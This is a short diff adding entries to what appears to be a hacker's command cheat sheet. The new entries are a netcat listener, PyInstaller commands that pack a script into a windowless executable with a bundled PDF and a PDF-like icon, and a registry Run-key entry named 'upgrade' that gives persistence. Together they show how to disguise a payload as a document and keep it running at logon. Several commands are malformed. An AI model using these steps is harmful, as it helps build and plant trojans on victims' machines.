@@ -317,5 +317,25 @@ netdiscover -r 182.154.164.1/24
 
 iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
 
+## NetCat ##
+
+nc -lvnp 10.10.10.10 80
+
+## Windows Embed ##
+
+C:\Users\Windows\AppData\Local\Programs\Python\Python310\python.exe -m install pyinstaller
+
+C:\Users\Windows\AppData\Local\Programs\Python\Python310\Scripts\pyinstaller.exe test.py --onefile
+
+C:\Users\Windows\AppData\Local\Programs\Python\Python310\Scripts\pyinstaller.exe test.py --onefile --add-file "C\Users\Defult\Desktop\kal.pdf;." 
+
+C:\Users\Windows\AppData\Local\Programs\Python\Python310\Scripts\pyinstaller.exe test.py --onefile --add-file "C\Users\Defult\Desktop\kal.pdf;." --noconsole
+
+C:\Users\Windows\AppData\Local\Programs\Python\Python310\Scripts\pyinstaller.exe test.py --onefile --add-file "C\Users\Defult\Desktop\kal.pdf;." --noconsole --icon C\Users\Defult\Desktop\kal.pdf
+
+## Regedit ##
+
+reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v upgrade /t REG_SZ /d "C:\Users\AppData\upgrade.exe"
+
  
 
